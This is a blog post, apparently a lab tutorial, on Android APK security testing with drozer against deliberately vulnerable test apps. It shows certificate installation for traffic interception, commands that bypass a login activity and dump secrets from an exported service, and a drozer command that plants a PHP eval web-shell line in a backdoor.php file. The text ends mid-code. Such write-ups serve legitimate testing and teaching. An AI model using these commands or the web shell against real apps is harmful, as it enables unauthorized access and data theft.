@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Reference：  【APK安全】APK应用安全测试策略-CSDN博客 Android APP-四大组件安全测试-先知社区 https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;826439b24467 Android四大组件安全漏洞实战 - 蚁景网安实验室 - 博客园   How to sniff packet? There is just a detection for client">
+<meta property="og:type" content="article">
+<meta property="og:title" content="APK安全测试">
+<meta property="og:url" content="http://example.com/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="少欣安全">
+<meta property="og:description" content="Reference：  【APK安全】APK应用安全测试策略-CSDN博客 Android APP-四大组件安全测试-先知社区 https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;826439b24467 Android四大组件安全漏洞实战 - 蚁景网安实验室 - 博客园   How to sniff packet? There is just a detection for client">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173121566.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173149587.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105330948.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131340290.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131448232.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105753249.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105838954.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922110258485.png">
+<meta property="og:image" content="c:\Users\RedTeamer\AppData\Roaming\Typora\typora-user-images\image-20250922110649496.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922111040903.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131826719.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151617879.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151734047.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151829137.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140010685.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140203300.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142017901.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142047595.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142723441.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142647122.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924105533337.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924110021800.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092722780.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092955453.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094216723.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094356414.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924100755596.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924101320234.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102628867.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102809532.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103551392.png">
+<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103733116.png">
+<meta property="article:published_time" content="2025-11-06T02:04:28.000Z">
+<meta property="article:modified_time" content="2025-11-06T07:36:25.297Z">
+<meta property="article:author" content="shaoxinSEC">
+<meta property="article:tag" content="APP 移动安全 安卓安全测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173121566.png">
+
+<link rel="canonical" href="http://example.com/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>APK安全测试 | 少欣安全</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">少欣安全</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="shaoxinSEC">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少欣安全">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          APK安全测试
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-06 10:04:28 / Modified: 15:36:25" itemprop="dateCreated datePublished" datetime="2025-11-06T10:04:28+08:00">2025-11-06</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>13 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <meta name="referrer" content="no-referrer"/>
+
+<blockquote>
+<p>Reference：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40037555/article/details/151819602">【APK安全】APK应用安全测试策略-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11538">Android APP-四大组件安全测试-先知社区</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/826439b24467">https://www.jianshu.com/p/826439b24467</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/19048752">Android四大组件安全漏洞实战 - 蚁景网安实验室 - 博客园</a></li>
+</ol>
+</blockquote>
+<h2 id="How-to-sniff-packet"><a href="#How-to-sniff-packet" class="headerlink" title="How to sniff packet?"></a>How to sniff packet?</h2><ol>
+<li><p>There is just a detection for client to check system cert.</p>
+<ul>
+<li><p>Import .der from burp: bp.der</p>
+</li>
+<li><p>Transform .der to .pem through openssl</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -in bp.der -out bp.pem</span><br><span class="line">openssl x509 -subject_hash_old -in bp.pem</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>adb push bp.pem &#x2F;sdcard&#x2F;download</p>
+</li>
+<li><p>adb shell: mv &#x2F;sdcard&#x2F;Downlaod&#x2F;bp.pem &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;9a5ba575.0</p>
+</li>
+<li><p>You can also install cert by magisk modul “MoveCACerts”</p>
+</li>
+</ul>
+</li>
+<li><p>There are built-in certificates within the client.</p>
+<p> Reverse the app and hook the cert.</p>
+</li>
+</ol>
+<h2 id="反Frida调试"><a href="#反Frida调试" class="headerlink" title="反Frida调试"></a>反Frida调试</h2><h3 id="修改启动端口"><a href="#修改启动端口" class="headerlink" title="修改启动端口"></a>修改启动端口</h3><p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173121566.png" alt="image-20251015173121566"></p>
+<p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173149587.png" alt="image-20251015173149587"></p>
+<h2 id="Four-Major-Components"><a href="#Four-Major-Components" class="headerlink" title="Four Major Components"></a>Four Major Components</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><table>
+<thead>
+<tr>
+<th align="center">Attack Surface</th>
+<th align="center">Harm</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Unauthorized Access</td>
+<td align="center">例如：绕过登陆界面，直接调用、访问后面的activity界面</td>
+</tr>
+<tr>
+<td align="center">DoS</td>
+<td align="center">通过Intent给Activity传输畸形数据，导致程序崩溃</td>
+</tr>
+<tr>
+<td align="center">Implicit Itent Hajacking</td>
+<td align="center">放在一个一样的界面，收集用户的账号密码</td>
+</tr>
+</tbody></table>
+<h4 id="Unauthorized-Access"><a href="#Unauthorized-Access" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
+<li><p>Deploy environment</p>
+ <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 测试APP：https://github.com/as0ler/Android-Examples</span><br><span class="line">2. 测试工具：https://github.com/ReversecLabs/drozer; https://github.com/ReversecLabs/drozer-agent</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Start the test app(testapp) and get it’s package name with “App messenger” or other ways</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105330948.png" alt="image-20250922105330948"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131340290.png" alt="image-20250922131340290"></p>
+</li>
+<li><p>Connect the device and enter drozer’s console.</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131448232.png" alt="image-20250922131448232"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105753249.png" alt="image-20250922105753249"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105838954.png" alt="image-20250922105838954"></p>
+</li>
+<li><p>Fint attacksufaces of the app.</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface YourPacakgeName</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922110258485.png" alt="image-20250922110258485"></p>
+</li>
+<li><p>Verify exported activities</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a YourPackageName</span><br></pre></td></tr></table></figure>
+
+<p> <img src="C:\Users\RedTeamer\AppData\Roaming\Typora\typora-user-images\image-20250922110649496.png" alt="image-20250922110649496"></p>
+</li>
+<li><p>Start other activity to bypass MainActivity</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component YourPackageName YourPackageName.ActivityName</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922111040903.png" alt="image-20250922111040903"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131826719.png" alt="image-20250922131826719"></p>
+</li>
+</ol>
+<h4 id="Implicit-Itent-Hijacking"><a href="#Implicit-Itent-Hijacking" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 参考文章：https://blog.csdn.net/qq_40037555/article/details/151955581</span><br><span class="line">2. 隐式 Intent 通过 action、category、data 等属性来匹配目标 Activity，而非直接指定具体类名。这意味着任何应用只要在 Manifest 中声明了匹配这些属性的 Activity，都可能被系统选中并启动。</span><br><span class="line">3. 攻击者可以创建恶意应用，在其 Manifest 中注册与目标应用相同的 Intent Filter（包含相同的 action、category 等）。当系统解析隐式 Intent 时，恶意 Activity 可能被优先匹配并启动。</span><br><span class="line">4. 建议尽量使用显式 Intent 启动内部 Activity，对必须使用的隐式 Intent，应通过设置包名（setPackage ()）或使用签名验证等方式限制接收者。</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>Test method of verify the vulnerability is same to “PriEsc and bypass”</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151617879.png" alt="image-20250922151617879"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151734047.png" alt="image-20250922151734047"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151829137.png" alt="image-20250922151829137"></p>
+</li>
+<li><p>But there are some differences in exploit the vulnerability. Attackers usually need to prepare the same page for fishing and an application for monitoring target activities to call the fishing page automatically.</p>
+</li>
+</ol>
+<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><table>
+<thead>
+<tr>
+<th align="center">Attack Surface</th>
+<th align="center">Harm</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Unauthorized Access</td>
+<td align="center">Call the service to excute some dangerous functions with null privilege.</td>
+</tr>
+<tr>
+<td align="center">Implicit Itent Hijacking</td>
+<td align="center">Get some received sensitive datas or return some vicious datas to other functions.</td>
+</tr>
+</tbody></table>
+<h4 id="Unauthorized-Access-1"><a href="#Unauthorized-Access-1" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
+<li><p>Find out the attack surfaces about service with drozer(test app: com.asec.alan)</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.asec.alan</span><br><span class="line">run app.service.info -a com.asec.alan</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140010685.png" alt="image-20250923140010685"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140203300.png" alt="image-20250923140203300"></p>
+</li>
+<li><p>Confirm how the service is invoked by revesing the apk.</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableService&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_WRITE_FILE&quot;</span>.equals(action)) &#123;</span><br><span class="line">                writeToFile(intent.getStringExtra(<span class="string">&quot;file_path&quot;</span>), intent.getStringExtra(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_GET_SECRET&quot;</span>.equals(action)) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;敏感信息: &quot;</span> + getSensitiveInformation());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, i, i2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(str));</span><br><span class="line">            fileWriter.write(str2);</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;写入文件错误&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getSensitiveInformation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;数据库密码: dbpass123; API密钥: secretkey456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">&quot;com.asec.alan.VulnerableService&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>We can draw a conclusion that this service is invoked by starting rather than binding. So, we could start the service with drozer.</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named writeToFile by the action whitch value is com.asec.alan.ACTION_WRITE_FILE</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_WRITE_FILE --extra string file_path &quot;/data/data/com.asec.alan/backdoor.php&quot; --extra string content &quot;&lt;?php @eval($_POST[&#x27;TscanPlus&#x27;]); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142017901.png" alt="image-20250923142017901"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142047595.png" alt="image-20250923142047595"></p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monitor the <span class="built_in">log</span> by adb</span></span><br><span class="line">adb logcat VulnerableService:D *:S</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named getSensitiveInformation by the action <span class="built_in">which</span> value is com.asec.alan.ACTION_GET_SECRET</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_GET_SECRET</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142723441.png" alt="image-20250923142723441"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142647122.png" alt="image-20250923142647122"></p>
+</li>
+</ol>
+<h4 id="Implicit-Itent-Hijacking-1"><a href="#Implicit-Itent-Hijacking-1" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 隐式 Intent 通过 action、category、data 等属性匹配 Service，而非直接指定具体类名。这使得任何应用只要在 Manifest 中注册了匹配这些属性的 Service，都可能被系统选中并启动。攻击者可通过伪装相同的 Intent Filter，让系统优先启动恶意 Service。</span><br><span class="line">2. Service 通常在后台运行，用户无法直接感知其启动和运行状态。即使恶意 Service 被启动，用户也难以察觉，导致恶意代码可长期在后台执行敏感操作（如监听数据、篡改通信等）。</span><br><span class="line">3. 为 Service 设置自定义权限（android:permission），并校验调用者的签名或权限;对必须使用的隐式 Intent，通过setPackage()限制目标应用包名。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h3><h4 id="Unauthorized-Access-2"><a href="#Unauthorized-Access-2" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
+<li><p>Determine the information of broadcast</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info -a com.asec.alan</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924105533337.png" alt="image-20250924105533337"></p>
+</li>
+<li><p>Obtain the source code through decompilation</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_SENSITIVE_OPERATION&quot;</span>.equals(intent.getAction())) &#123;</span><br><span class="line">            performSensitiveOperation(context, 